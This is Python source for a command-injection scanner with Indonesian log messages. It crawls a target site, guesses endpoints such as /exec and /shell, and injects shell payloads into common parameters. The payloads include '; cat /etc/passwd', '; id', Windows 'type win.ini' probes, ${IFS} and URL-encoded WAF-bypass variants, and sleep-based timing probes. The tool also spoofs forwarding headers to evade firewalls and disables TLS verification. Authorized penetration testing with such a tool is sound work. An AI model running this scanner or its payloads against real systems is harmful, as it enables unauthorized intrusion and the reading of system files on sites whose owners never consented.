# checker/cmdi.py — CommandInjectionChecker v2
import re
import time
import threading
from typing import Dict, Any, Optional, List
from urllib.parse import urljoin, quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from helpers.http_client import HttpClient
from helpers.browser import crawl_spa
from helpers.parsers import (
    is_spa_html,
    spa_confidence,
    extract_forms,
    extract_paths_from_js,
    extract_all_js_paths,
    normalize_url,
)

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# ── Terminal output helpers ───────────────────────────────────────────────────

def _info(msg: str):  print(f"  [*] {msg}")
def _ok(msg: str):    print(f"  [+] {msg}")
def _warn(msg: str):  print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): print(f"\n  [{n}/{total}] {msg}")


# ── Headers ───────────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,*/*',
}

JSON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, */*',
    'X-Requested-With': 'XMLHttpRequest',
}

WAF_BYPASS_HEADERS = [
    {},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'CF-Connecting-IP': '127.0.0.1'},
]


# ── Payloads ──────────────────────────────────────────────────────────────────

_CMD_TOKEN = 'xpwn7z_rce_confirmed_xpwn7z'

CMD_PAYLOADS = [
    f'; echo {_CMD_TOKEN}',
    f'| echo {_CMD_TOKEN}',
    f'&& echo {_CMD_TOKEN}',
    '; id',
    '| id',
    '; whoami',
    '; cat /etc/passwd',
    f'$(echo {_CMD_TOKEN})',
    f'& echo {_CMD_TOKEN}',
    '& whoami',
    '& dir',
    '& type C:\\Windows\\win.ini',
    '& ver',
]

WAF_BYPASS_PAYLOADS = [
    f'%7C%20echo%20{_CMD_TOKEN}',
    f';${{IFS}}echo${{IFS}}{_CMD_TOKEN}',
    f'%0aecho%20{_CMD_TOKEN}',
    f'%26%20echo%20{_CMD_TOKEN}',
]

TIME_PAYLOADS = [
    '; sleep 5',
    '| sleep 5',
    '$(sleep 5)',
    '& timeout /t 5',
    '& ping -n 5 127.0.0.1',
]

CMD_SUCCESS_SIGNATURES = [
    _CMD_TOKEN,
    'uid=0(root)', 'uid=', 'root:x:', 'daemon:x:',
    '/bin/bash', '/bin/sh', '/usr/bin',
    'volume serial number', 'windows_nt',
    'for 16-bit app support',
    'microsoft windows [version',
    'directory of c:\\',
    'packets: sent', 'packet loss',
    'bytes from', 'ttl=',
    'approximate round trip',
]

CLOUDFLARE_SIGNATURES = [
    'cloudflare', 'cf-ray', 'just a moment',
    'checking your browser', 'cdn-cgi',
    'enable javascript', 'ddos protection',
    'ray id', 'cf_clearance',
]

TEST_ENDPOINTS = [
    '/ping', '/exec', '/run', '/cmd',
    '/api/ping', '/api/exec', '/api/run', '/api/cmd',
    '/tools/ping', '/network/ping',
    '/diagnostic', '/debug', '/convert', '/process',
    '/api/v1/ping', '/api/v1/exec',
    '/network/check', '/tools/traceroute',
    '/admin/exec', '/system/ping',
    '/api/command', '/api/diagnostic',
    '/api/network/ping', '/api/tools/ping',
    '/api/v1/run', '/api/v1/command',
    '/shell', '/terminal', '/execute',
    '/api/shell', '/api/execute',
    '/rce', '/api/rce',
    '/net/ping', '/util/ping',
    '/v1/ping', '/v2/ping',
    '/health/exec', '/status/ping',
]

API_CMD_SUFFIXES = [
    '/ping', '/exec', '/run', '/cmd',
    '/diagnostic', '/debug',
    '/process', '/traceroute', '/check',
    '/execute', '/shell',
    '/posts/ping', '/posts/exec',
    '/users/ping', '/items/exec',
]

TEST_PARAMS = [
    'ip', 'host', 'cmd', 'command', 'exec',
    'run', 'ping', 'query', 'input', 'data',
    'target', 'dest', 'addr', 'url',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'CMDI_CRITICAL',
    'HIGH':     'CMDI_HIGH',
    'MEDIUM':   'CMDI_MEDIUM',
    'LOW':      'CMDI_LOW',
}

# Signature yang langsung konfirmasi RCE → CRITICAL
_CRITICAL_SIGNATURES = {
    _CMD_TOKEN, 'uid=0(root)', 'root:x:', 'daemon:x:',
    '/bin/bash', '/bin/sh', '/usr/bin',
    'for 16-bit app support', 'microsoft windows [version',
    'directory of c:\\',
}

# Signature OS info → HIGH
_HIGH_SIGNATURES = {
    'uid=', 'volume serial number', 'windows_nt',
}

_AUTH_PATHS = {'login', 'signin', 'auth', 'oauth', 'callback', 'admin'}


def _classify_severity(url: str, signature: str, method: str, is_time_based: bool) -> str:
    if is_time_based:
        return 'HIGH'

    if signature in _CRITICAL_SIGNATURES:
        path = urlparse(url).path.lower()
        if any(kw in path for kw in _AUTH_PATHS):
            return 'CRITICAL'
        return 'CRITICAL'

    if signature in _HIGH_SIGNATURES:
        return 'HIGH'

    if signature in {'packets: sent', 'packet loss', 'bytes from', 'ttl=', 'approximate round trip'}:
        return 'MEDIUM'

    return 'LOW'


# ── JS src extractor ──────────────────────────────────────────────────────────

def _extract_js_srcs(html: str, base_url: str = '') -> List[str]:
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')
    srcs = []
    for s in soup.find_all('script'):
        src = s.get('src', '').strip()
        if src:
            srcs.append(normalize_url(src, base_url))
    for link in soup.find_all('link'):
        rel     = link.get('rel', [])
        rel_str = ' '.join(rel).lower() if isinstance(rel, list) else str(rel).lower()
        href    = link.get('href', '').strip()
        if 'modulepreload' in rel_str and href and href.endswith(('.js', '.mjs')):
            srcs.append(normalize_url(href, base_url))
        if 'preload' in rel_str and link.get('as') == 'script' and href:
            srcs.append(normalize_url(href, base_url))
    return list(dict.fromkeys(srcs))


# ── Main class ────────────────────────────────────────────────────────────────

class CommandInjectionChecker:
    def __init__(
        self,
        url: str,
        timeout: float = 6.0,
        extra_paths: Optional[List[str]] = None,
        cookies: Optional[Dict] = None,
    ):
        self.base_url                  = url.rstrip('/')
        self.timeout                   = int(timeout)
        self.extra_paths               = extra_paths or []
        self.cookies                   = cookies or {}
        self._found_urls: set          = set()
        self._is_spa                   = False
        self._waf_detected             = False
        self._api_bases: List          = []
        self._playwright_cookies: Dict = {}
        self._lock                     = threading.Lock()
        self._vuln_found               = threading.Event()

        self._client = HttpClient(
            timeout=self.timeout,
            headers=HEADERS,
            cookies=self.cookies,
            verify=False,
            retries=1,
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _is_cloudflare_page(self, text: str) -> bool:
        return any(sig in text.lower() for sig in CLOUDFLARE_SIGNATURES)

    def _is_real_endpoint(self, r) -> bool:
        if not r:
            return False
        ct = r.headers.get('Content-Type', '').lower()
        if 'application/json' in ct:
            return True
        if self._is_cloudflare_page(r.text):
            return False
        if is_spa_html(r.text):
            return False
        return True

    def _detect_waf(self) -> bool:
        r = self._client.get(
            f"{self.base_url}/?x=<script>alert(1)</script>",
            headers=HEADERS
        )
        if not r:
            return False
        waf_headers = {'cf-ray', 'x-sucuri-id', 'x-firewall', 'x-waf', 'x-cdn'}
        if waf_headers & {k.lower() for k in r.headers.keys()}:
            return True
        if self._is_cloudflare_page(r.text):
            return True
        return r.status_code == 403

    def _get_with_bypass(self, url: str):
        for extra_h in WAF_BYPASS_HEADERS:
            r = self._client.get(url, headers={**JSON_HEADERS, **extra_h})
            if r and not self._is_cloudflare_page(r.text) and self._is_real_endpoint(r):
                return r
        return None

    # ── Endpoint discovery ────────────────────────────────────────────────────

    def _probe_endpoint(self, url: str, active: list):
        with self._lock:
            if url in active:
                return
        r = self._client.get(url, headers=JSON_HEADERS)
        if not r or r.status_code in (404, 410):
            return
        ct = r.headers.get('Content-Type', '').lower()
        if 'text/html' in ct and self._is_cloudflare_page(r.text):
            return

        should_add = False
        if 'application/json' in ct:
            should_add = True
        elif self._waf_detected and r.status_code == 403 \
                and not self._is_cloudflare_page(r.text):
            should_add = True
        elif r.status_code in (200, 201, 405) \
                and 'text/html' not in ct \
                and self._is_real_endpoint(r):
            should_add = True

        if should_add:
            with self._lock:
                if url not in active:
                    active.append(url)
                    _ok(f"Endpoint ditemukan: {url}")

    def _crawl_js_endpoints(self) -> List[str]:
        found = []
        r = self._client.get(self.base_url, headers=HEADERS)
        if not r:
            return found

        is_cf      = self._is_cloudflare_page(r.text)
        confidence = spa_confidence(r.text)

        if confidence >= 2 and not is_cf:
            self._is_spa = True
            _info("SPA terdeteksi, crawling dengan Playwright ...")
            if PLAYWRIGHT_AVAILABLE:
                try:
                    pw_data = crawl_spa(
                        self.base_url, block_images=True,
                        initial_cookies=[
                            {"name": k, "value": v, "url": self.base_url}
                            for k, v in self.cookies.items()
                        ] if self.cookies else None,
                    )
                    self._playwright_cookies = pw_data.get("cookies", {})
                    for call in pw_data.get("api_calls", []):
                        path = call["url"].replace(self.base_url, "").split("?")[0].split("#")[0]
                        if path and path != "/" and not path.startswith("http"):
                            found.append(path)
                    found.extend(extract_all_js_paths(pw_data.get("html", "")))
                    js_srcs = _extract_js_srcs(pw_data.get("html", ""), self.base_url)
                    for js_url in js_srcs:
                        js_r = self._client.get(js_url)
                        if js_r and js_r.ok:
                            found.extend(extract_paths_from_js(js_r.text))
                            self._extract_api_bases(js_r.text)
                except Exception as e:
                    _warn(f"Playwright gagal ({e}), fallback ke JS parsing")
                    self._fallback_js_crawl(r, found)
            else:
                _info("Playwright tidak tersedia, fallback ke JS parsing")
                self._fallback_js_crawl(r, found)
        else:
            self._fallback_js_crawl(r, found)

        unique = list(set(found))
        if self._api_bases:
            _info(f"External API ditemukan: {', '.join(self._api_bases)}")
        return unique

    def _fallback_js_crawl(self, r, found: list):
        js_srcs = _extract_js_srcs(r.text, self.base_url)
        for js_url in js_srcs:
            js_r = self._client.get(js_url)
            if js_r and js_r.ok:
                found.extend(extract_paths_from_js(js_r.text))
                self._extract_api_bases(js_r.text)
        found.extend(extract_all_js_paths(r.text))

    def _extract_api_bases(self, js_text: str):
        for api_url in re.findall(
            r'["\`](https?://[a-zA-Z0-9._-]+/api(?:/[a-zA-Z0-9_/-]*)?)["\`]',
            js_text
        ):
            base = api_url.rstrip('/')
            if base not in self._api_bases:
                self._api_bases.append(base)

        for base in re.findall(
            r'["\`](/api/[a-zA-Z0-9_-]+(?:/[a-zA-Z0-9_-]+)?)["\`]',
            js_text
        ):
            parts = base.strip('/').split('/')
            if len(parts) >= 2:
                normalized = '/' + '/'.join(parts[:2])
                if normalized not in self._api_bases:
                    self._api_bases.append(normalized)

    def _build_api_endpoints(self) -> List[str]:
        candidates = []
        for base in self._api_bases:
            for suffix in API_CMD_SUFFIXES:
                full = (base.rstrip('/') + suffix) if base.startswith('http') \
                       else (base + suffix)
                candidates.append(full)
        return candidates

    # ── Injection core ────────────────────────────────────────────────────────

    def _check_response(self, r, url: str, param: str,
                        payload: str, method: str, results: Dict) -> bool:
        if not r or self._is_cloudflare_page(r.text):
            return False

        ct = r.headers.get('Content-Type', '').lower()
        if 'text/html' in ct:
            return False

        body_lower = r.text.lower()
        for sig in CMD_SUCCESS_SIGNATURES:
            if sig in body_lower:
                key = f"{method}:{url}:{param}:{sig}"
                registered = False
                with self._lock:
                    if key not in self._found_urls:
                        self._found_urls.add(key)
                        registered = True
                if registered:
                    vuln_url = f"{url}?{param}=127.0.0.1{payload}" \
                               if method != 'POST' else url

                    # ── Tambahan: classify severity & build entry standar ──
                    severity = _classify_severity(url, sig, method, is_time_based=False)
                    parsed   = urlparse(url)

                    _warn(f"CMD Injection [{severity}] ({method}) → param={param} | sig={sig}")
                    with self._lock:
                        results['vulnerable_paths'].append({
                            'url':           vuln_url,
                            'path':          parsed.path,
                            'base':          f"{parsed.scheme}://{parsed.netloc}",
                            'param':         param,
                            'payload':       payload,
                            'signature':     sig,
                            'method':        method,
                            'status_code':   r.status_code,
                            'severity':      severity,
                            'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                            'file_count':    0,
                            'dir_count':     0,
                            'notable_files': [],
                            'is_nested':     False,
                        })
                    self._vuln_found.set()
                return True
        return False

    def _inject_one(self, url: str, param: str, payload: str,
                    results: Dict, method: str = 'GET') -> bool:
        if self._vuln_found.is_set():
            return False

        with self._lock:
            results['total_tested'] += 1

        if method == 'POST':
            r = self._client.post(
                url, data={param: f"127.0.0.1{payload}"}, headers=JSON_HEADERS
            )
        else:
            test_url = f"{url}?{param}=127.0.0.1{payload}"
            r = self._get_with_bypass(test_url) or \
                self._client.get(test_url, headers=JSON_HEADERS)

        return self._check_response(r, url, param, payload, method, results)

    def _inject_endpoint(self, url: str, results: Dict):
        if self._vuln_found.is_set():
            return

        payloads = CMD_PAYLOADS + (WAF_BYPASS_PAYLOADS if self._waf_detected else [])

        def task(param: str, payload: str):
            if self._vuln_found.is_set():
                return
            found = self._inject_one(url, param, payload, results, 'GET')
            if not found and not self._vuln_found.is_set():
                self._inject_one(url, param, payload, results, 'POST')

        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [
                ex.submit(task, param, payload)
                for param in TEST_PARAMS
                for payload in payloads
            ]
            for f in as_completed(futures):
                if self._vuln_found.is_set():
                    for remaining in futures:
                        remaining.cancel()
                    break
                try:
                    f.result()
                except Exception:
                    pass

    # ── Time-based ────────────────────────────────────────────────────────────

    def _time_based_scan(self, active_endpoints: List[str], results: Dict):
        for url in active_endpoints:
            if self._vuln_found.is_set():
                break
            for param in TEST_PARAMS[:5]:
                if self._vuln_found.is_set():
                    break
                for payload in TIME_PAYLOADS:
                    try:
                        start   = time.time()
                        self._client.get(
                            f"{url}?{param}=127.0.0.1{payload}",
                            headers=JSON_HEADERS, timeout=12
                        )
                        elapsed = time.time() - start

                        if elapsed >= 4.5:
                            key = f"TIME:{url}:{param}"
                            registered = False
                            with self._lock:
                                if key not in self._found_urls:
                                    self._found_urls.add(key)
                                    registered = True
                            if registered:
                                # ── Tambahan: classify severity time-based ──
                                severity = _classify_severity(url, '', 'GET', is_time_based=True)
                                parsed   = urlparse(url)

                                _warn(f"CMD Injection [{severity}] (time-based) → "
                                      f"param={param} | delay={elapsed:.1f}s")
                                with self._lock:
                                    results['vulnerable_paths'].append({
                                        'url':           f"{url}?{param}=127.0.0.1{payload}",
                                        'path':          parsed.path,
                                        'base':          f"{parsed.scheme}://{parsed.netloc}",
                                        'param':         param,
                                        'payload':       payload,
                                        'signature':     f'time-based delay ({elapsed:.1f}s)',
                                        'method':        'GET',
                                        'status_code':   0,
                                        'severity':      severity,
                                        'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                                        'file_count':    0,
                                        'dir_count':     0,
                                        'notable_files': [],
                                        'is_nested':     False,
                                    })
                                self._vuln_found.set()
                            break
                    except Exception:
                        pass

    # ── Form scan ─────────────────────────────────────────────────────────────

    def _scan_forms(self, results: Dict):
        if self._vuln_found.is_set():
            return
        r_main = self._client.get(self.base_url, headers=JSON_HEADERS)
        if not r_main or not r_main.ok or self._is_cloudflare_page(r_main.text):
            return
        for form in extract_forms(r_main.text, self.base_url):
            if self._vuln_found.is_set():
                break
            for inp in form['inputs']:
                if self._vuln_found.is_set():
                    break
                param  = inp['name']
                action = form['action']
                method = 'POST' if form['method'] == 'post' else 'GET'
                for payload in CMD_PAYLOADS:
                    if self._vuln_found.is_set():
                        break
                    self._inject_one(action, param, payload, results, method)

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':        False,
            'vulnerable_paths':  [],        # ← rename dari vulnerable_params
            'total_tested':      0,
            'findings':          [],
            'error':             None,
            'summary':           {},        # ← tambah
            'waf_detected':      False,
            'spa_detected':      False,
            'playwright_used':   False,
        }

        try:
            self._waf_detected      = self._detect_waf()
            results['waf_detected'] = self._waf_detected
            waf_status = "terdeteksi" if self._waf_detected else "tidak terdeteksi"
            pw_status  = "tersedia"   if PLAYWRIGHT_AVAILABLE else "tidak tersedia"
            _info(f"WAF: {waf_status} | Playwright: {pw_status}")

            _step(1, 3, "Mengumpulkan endpoint ...")
            active_endpoints = []

            if self.extra_paths:
                for path in self.extra_paths:
                    full = normalize_url(path, self.base_url)
                    with self._lock:
                        if full not in active_endpoints:
                            active_endpoints.append(full)
                            _ok(f"Extra path: {full}")

            with ThreadPoolExecutor(max_workers=15) as ex:
                futures = [
                    ex.submit(self._probe_endpoint,
                              urljoin(self.base_url, p), active_endpoints)
                    for p in TEST_ENDPOINTS
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except Exception: pass

            js_paths = self._crawl_js_endpoints()
            results['spa_detected']    = self._is_spa
            results['playwright_used'] = PLAYWRIGHT_AVAILABLE and self._is_spa

            api_candidates = self._build_api_endpoints()
            with ThreadPoolExecutor(max_workers=15) as ex:
                futures = [
                    ex.submit(self._probe_endpoint, p, active_endpoints)
                    if p.startswith('http') else
                    ex.submit(self._probe_endpoint,
                              urljoin(self.base_url, p), active_endpoints)
                    for p in js_paths + api_candidates
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except Exception: pass

            _info(f"Total {len(active_endpoints)} endpoint aktif")

            _step(2, 3, f"Injecting payload ke {len(active_endpoints)} endpoint ...")
            for url in active_endpoints:
                if self._vuln_found.is_set():
                    break
                self._inject_endpoint(url, results)

            self._scan_forms(results)

            if not results['vulnerable_paths']:
                _step(3, 3, "Time-based scan ...")
                self._time_based_scan(active_endpoints, results)
            else:
                _step(3, 3, "Time-based dilewati (sudah ada temuan)")

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'LOW')
                    sev_count[sev] = sev_count.get(sev, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths': count,
                    'severity_breakdown': {k: v for k, v in sev_count.items() if v > 0},
                }

                results['findings'].append(
                    f"Command Injection ditemukan pada {count} parameter."
                )
                for v in results['vulnerable_paths']:
                    results['findings'].append(
                        f"  → [{v['severity']}] [{v.get('method','GET')}] {v['url']} "
                        f"(param: {v['param']}, sig: {v['signature']})"
                    )
                _ok(
                    f"Total: {count} CMD Injection | "
                    f"CRITICAL={sev_count.get('CRITICAL', 0)} "
                    f"HIGH={sev_count.get('HIGH', 0)} "
                    f"MEDIUM={sev_count.get('MEDIUM', 0)}"
                )
            else:
                results['findings'].append(
                    "Tidak ditemukan indikasi Command Injection."
                )

        except Exception as e:
            results['error'] = str(e)
        finally:
            self._client.close()

        return results